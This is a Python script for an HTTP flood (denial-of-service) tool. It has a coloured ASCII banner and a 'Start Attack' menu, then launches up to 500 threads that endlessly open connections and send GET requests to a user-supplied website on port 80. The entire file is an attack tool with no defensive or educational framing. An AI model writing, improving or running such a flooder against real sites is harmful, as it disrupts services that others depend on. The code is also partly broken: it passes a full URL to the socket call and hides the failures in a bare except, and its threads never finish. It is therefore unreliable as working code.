import socket
import random
import threading
import os
import sys
import requests

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((target, port))
            s.sendto((f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n").encode('ascii'), (target, port))
            print("\033[92mAttack sent to {target} successfully\033[0m")
            s.close()
        except:
            pass

def enable_virtual_terminal_processing():
    if sys.platform == "win32":
        os.system("")

def gradient(start_rgb, end_rgb, steps):
    gradient_colors = []
    for i in range(steps):
        interp = lambda start, end, step: int(start + (end - start) * (step / (steps - 1)))
        r = interp(start_rgb[0], end_rgb[0], i)
        g = interp(start_rgb[1], end_rgb[1], i)
        b = interp(start_rgb[2], end_rgb[2], i)
        gradient_colors.append((r, g, b))
    return gradient_colors

def check_valid_website(url):
    try:
        response = requests.head(url)
        return response.status_code == 200
    except:
        return False

os.system('cls' if os.name == 'nt' else 'clear')

enable_virtual_terminal_processing()

start_color = (0, 0, 255)
end_color = (128, 0, 128)

try:
    with open('art/ascii.txt', 'r', encoding='utf-8') as file:
        ascii_art = file.read()
except UnicodeDecodeError as e:
    print(f"Error reading the file: {e}")
    ascii_art = ""

if ascii_art:
    lines = ascii_art.splitlines()
    num_lines = len(lines)

    colors = gradient(start_color, end_color, num_lines)

    for i, line in enumerate(lines):
        r, g, b = colors[i]
        print(f"\033[38;2;{r};{g};{b}m{line}\033[0m")

print(" ")
print("[1] Start Attack")
print(" ")
option = input("Choose an option: ")

if option == "1":
    target = input("> URL ")
    if check_valid_website(target):
        while True:
            num_attacks = input("Choose number of attacks (1-500): ")
            if num_attacks.isdigit():
                num_attacks = int(num_attacks)
                if num_attacks <= 500:
                    break
                else:
                    print("Choose a number between 1 and 500 for the attacks. Try again.")
            else:
                print("Invalid input. Please choose a number between 1 and 500. Try again.")

        port = 80
        threads = []
        for _ in range(num_attacks):
            thread = threading.Thread(target=attack)
            threads.append(thread)
            thread.start()
            print("\033[92mAttack sent\033[0m")

        for thread in threads:
            thread.join()

        print("All attacks done")
    else:
        print("Invalid website. Please provide a valid URL.")